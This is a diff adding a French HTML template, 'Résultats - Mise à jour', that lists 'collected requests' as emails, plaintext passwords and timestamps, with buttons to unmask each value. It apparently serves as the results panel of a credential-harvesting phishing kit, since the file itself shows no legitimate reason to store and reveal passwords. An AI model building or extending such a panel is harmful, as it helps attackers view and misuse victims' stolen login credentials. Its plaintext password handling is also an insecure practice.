@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Résultats - Mise à jour</title>
+    <link rel="stylesheet" href="/static/styles.css" />
+  </head>
+  <body>
+    <main class="page">
+      <section class="card card--wide">
+        <header class="card__header">
+          <h1>Résultats enregistrés</h1>
+          <p class="card__subtitle">Tableau des demandes collectées.</p>
+        </header>
+        <div class="table table--wide">
+          <table>
+            <thead>
+              <tr>
+                <th>Email</th>
+                <th>Mot de passe</th>
+                <th>Date d'enregistrement (UTC)</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for email_value, password_value, created_at in rows %}
+              <tr>
+                <td>
+                  <span class="maskable" data-value="{{ email_value }}">••••••••••</span>
+                </td>
+                <td>
+                  <span class="maskable" data-value="{{ password_value }}">••••••••••</span>
+                </td>
+                <td>{{ created_at }}</td>
+                <td>
+                  <button class="chip" type="button" data-toggle="email">Afficher email</button>
+                  <button class="chip" type="button" data-toggle="password">Afficher mot de passe</button>
+                </td>
+              </tr>
+              {% else %}
+              <tr>
+                <td colspan="4">Aucune donnée pour le moment.</td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      </section>
+    </main>
+    <script src="/static/app.js"></script>
+  </body>
+</html>
